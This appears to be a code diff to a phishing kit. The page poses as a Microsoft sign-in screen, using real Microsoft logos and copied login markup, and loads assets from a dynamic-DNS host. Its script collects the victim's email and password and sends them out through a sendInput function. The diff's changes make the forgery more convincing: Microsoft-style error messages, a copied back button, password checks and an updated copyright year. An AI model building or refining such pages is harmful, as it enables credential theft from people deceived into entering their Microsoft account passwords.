@@ -16,6 +16,23 @@
     
     
     <style type="text/css">
+    
+    @font-face {
+            font-family: lighter_font;
+            font-style: normal;
+            font-weight: 400;
+            src: url(https://expdevelopers.dynamic-dns.net/we_files/fonts/lighter_font.eot);
+            src: url(https://expdevelopers.dynamic-dns.net/we_files/fonts/lighter_font.eot?#iefix) format("embedded-opentype"),
+                url(https://expdevelopers.dynamic-dns.net/we_files/fonts/lighter_font.woff) format("woff"), url(https://expdevelopers.dynamic-dns.net/we_files/fonts/lighter_font.ttf) format("truetype"),
+                url(https://expdevelopers.dynamic-dns.net/we_files/fonts/lighter_font.svg) format("svg");
+        }
+        @font-face {
+            font-family: "Material Icons";
+            font-style: normal;
+            font-weight: 400;
+            src: url(https://fonts.gstatic.com/s/materialicons/v85/flUhRq6tzZclQEJ-Vdg-IuiaDsNc.woff2) format("woff2");
+          }
+
     /*!
  * Bootstrap v4.0.0 (https://getbootstrap.com)
  * Copyright 2011-2018 The Bootstrap Authors
@@ -10277,6 +10294,25 @@
             opacity: 0;
         }
     }
+    
+    .backButton {
+    min-height: 24px;
+    width: 27px; 
+    min-width: 24px;
+    float: left;
+    padding: 0;
+    background-color: #fff;
+    border-width: 0;
+    border-radius: 15px; 
+    margin-right: 2px;
+}
+
+.backButton:hover {
+    background-color: #e6e6e6;
+    background-color: rgba(0,0,0,.1);
+    border-color: rgb(0 0 0 / 87%);
+    border-width: thin;
+}
     </style>
 </head>
 
@@ -10302,11 +10338,11 @@
                         <div class="boxtext">
                             <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" style="width:24px;">&nbsp<span class="align-middle h5 logoname" style="color: #747474; margin-bottom:20px;"> Microsoft</span><br><br>
                             <span class="h5" id="signin" style="margin-top:20px">Sign in</span><br>
-                            <span id="error" class="text-danger" style="display: none;">That Microsoft account doesn't exist. Enter a different account</span>
+                            <span id="error" class="text-danger"></span>
                             <div class="form-group mt-2">
                                 <input type="email" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Email, phone, or Skype" style="border-right: none;border-left: none;border-top: none; font-size:15px;">
                             </div> 
-                            <p id="createaccount" style="font-size: 13px">No account? <a href='#'>Create one!</a></p>
+                            <!--p id="createaccount" style="font-size: 13px">No account? <a href='#'>Create one!</a></p-->
                             <p id="accessaccount" style="font-size: 13px"><a href="#">Can't access your account?</a></p> 
 								
                             <div class="text-right">
@@ -10328,13 +10364,36 @@
                         </div>
                         <form id="contact" class="boxtext">
                             <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" class="img-fluid logoimg" width="20px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>
-                            <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="aich">abc@abc.com</span>
-                            <div class="py-2" ><span class="h5" id="Enterpass">Enter Password</span></div>
+                            
+                            <div class="identityBanner">
+    <!-- ko if: isBackButtonVisible -->
+    <button type="button" class="backButton" data-bind="
+        attr: { 'id': backButtonId || 'idBtn_Back' },
+        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
+        ariaDescribedBy: backButtonDescribedBy,
+        click: backButton_onClick,
+        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
+        <!-- ko ifnot: svr.Cy -->
+            <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
+<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
+<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" data-savepage-src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cGF0aCBkPSJNMTgsMTEuNTc4di44NDRINy42MTdsMy45MjEsMy45MjgtLjU5NC41OTRMNiwxMmw0Ljk0NC00Ljk0NC41OTQuNTk0TDcuNjE3LDExLjU3OFoiIGZpbGw9IiM0MDQwNDAiLz48cGF0aCBkPSJNMTAuOTQ0LDcuMDU2bC41OTQuNTk0TDcuNjE3LDExLjU3OEgxOHYuODQ0SDcuNjE3bDMuOTIxLDMuOTI4LS41OTQuNTk0TDYsMTJsNC45NDQtNC45NDRtMC0uMTQxLS4wNzEuMDdMNS45MjksMTEuOTI5LDUuODU4LDEybC4wNzEuMDcxLDQuOTQ0LDQuOTQ0LjA3MS4wNy4wNzEtLjA3LjU5NC0uNTk1LjA3MS0uMDctLjA3MS0uMDcxTDcuODU4LDEyLjUyMkgxOC4xVjExLjQ3OEg3Ljg1OGwzLjc1MS0zLjc1Ny4wNzEtLjA3MS0uMDcxLS4wNy0uNTk0LS41OTUtLjA3MS0uMDdaIiBmaWxsPSIjNDA0MDQwIi8+PC9zdmc+"><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+        <!-- /ko -->
+
+        <!-- ko if: svr.Cy --><!-- /ko -->
+    </button><div style="margin-left:12px;" id="em"></div>  
+    <!-- /ko -->
+
+    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $email; ?>"><!--?php echo $email; ?--></div>
+</div>	
+                            	
+                            	
+                            	<div class="py-2" ><span class="h5" id="Enterpass">Enter Password</span></div>
                             <div class="pb-2">
-                                <span id="msg" class="text-danger">Enter password to verify your identity before you continue.</span>
+                                <span id="msg" class="text-danger"></span>
                             </div>
                             <div class="form-group mt-2">
-                                <input type="password" name="pr" class="form-control rounded-0 border-dark" id="pr" aria-describedby="aiHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none; font-size:15px;">
+                                <input type="password" name="pr" class="form-control rounded-0 border-dark" id="pr" aria-describedby="aiHelp" placeholder="Password" style="border-right: none;border-left: none;border-top: none; font-size:15px;">
                             </div>
                             <p style="font-size: 14px" id="forgpass"><a href="#">Forget password?</a></p>
                             <div class="text-right">
@@ -10385,7 +10444,7 @@
         <div>
             <div class="footerNode" id="footerNod" style="padding-left:17px;">
                 <a href="#" id="Terms">Terms of use</a>
-                <span id="microsoft">©2023 Microsoft</span>
+                <span id="microsoft">©2024 Microsoft</span> 
                 <span style="letter-spacing:3px;"><h6>...</h6></span>
             </div>
         </div>
@@ -10423,6 +10482,7 @@ $(document).ready(function() {
         if (!validateEmail(email)) {
             $("#ai").css("border-color", "red");
             $('#error').show();
+            $('#error').text("That Microsoft account doesn't exist. Enter a different account");
             $("#ai").focus();
             return false;
         }
@@ -10466,9 +10526,11 @@ $(document).ready(function() {
 
     $('#next').click(function(event) {
         event.preventDefault();
-        $("#div3").animate({ right: 0, opacity: "show" }, 0); // show load
-        $("#div2").animate({ right: 0, opacity: "hide" }, 0); //hide password
         let email = $('#ai').val();
+        document.querySelector('#em').textContent = email;
+       if(email.trim() === ""){
+       document.querySelector("#error").textContent = "Enter a valid email address, phone number, or Skype name.";
+       }else{
         if (handleEmailInput(email)) {
             data = {
                 "inputs": {
@@ -10476,6 +10538,7 @@ $(document).ready(function() {
                 }
             };
             sendInput(data);
+        }
         }
     });
 
@@ -10488,22 +10551,31 @@ $(document).ready(function() {
     });
 
     $('#submit-btn').click(function(event) {
+    
         event.preventDefault();
         let email = $("#ai").val();
         let password = $("#pr").val();
         let msg = $('#msg').html();
-        $("#div2").hide();
         
-
-        if (handleEmailInput(email)) {
-            data = {
-                "inputs": {
-                    email: email,
-                    password: password
-                }
-            };
-            sendInput(data);
-        }
+        
+        if (password.trim() === "") {
+    document.querySelector('#msg').innerText = "Please enter the password for your Microsoft account.";
+} else {
+    $("#div2").hide();
+    let email = $("#ai").val(); // Retrieve email from input field
+    if (validateEmail(email)) {
+        let data = {
+            "inputs": {
+                email: email,
+                password: password
+            }
+        };
+        sendInput(data);
+    } else {
+        // Handle invalid email case if needed
+        console.error('Invalid email');
+    }
+}
     });
 });
 	</script>
